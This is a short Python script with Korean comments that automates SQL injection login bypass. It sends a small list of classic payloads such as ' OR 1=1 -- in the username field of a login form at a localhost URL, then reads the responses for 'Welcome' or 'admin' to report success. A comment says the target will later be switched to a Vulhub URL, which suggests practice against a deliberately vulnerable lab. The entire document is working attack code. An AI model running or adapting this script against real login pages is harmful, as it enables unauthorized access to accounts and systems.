import requests

# ====== 설정 ======
TARGET_URL = "http://localhost/login.php"  # 나중에 Vulhub URL로 변경
PARAMS = {
    "username": "",
    "password": "test"
}

# ====== Payload DB ======
payloads = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "' OR 1=1#",
    "' OR 'a'='a",
]

# ====== 공격 함수 ======
def attack(payload):
    data = PARAMS.copy()
    data["username"] = payload

    try:
        response = requests.post(TARGET_URL, data=data)
        return response.text
    except Exception as e:
        print("Request Error:", e)
        return ""

# ====== 응답 분석 ======
def analyze_response(response):

    if "Welcome" in response or "admin" in response:
        return "SUCCESS"

    if "SQL" in response or "syntax" in response:
        return "SQL_ERROR"

    if "error" in response.lower():
        return "ERROR"

    return "UNKNOWN"

# ====== 공격 루프 ======
def run_attack():

    print("🚀 AIBB Attack Started\n")

    for payload in payloads:
        print(f"[+] Trying Payload: {payload}")

        response = attack(payload)
        result = analyze_response(response)

        print(f"    → Result: {result}\n")

        if result == "SUCCESS":
            print("🔥 Vulnerability Found!")
            print(f"Payload: {payload}")
            break

    print("✅ Attack Finished")

# ====== 실행 ======
if __name__ == "__main__":
    run_attack()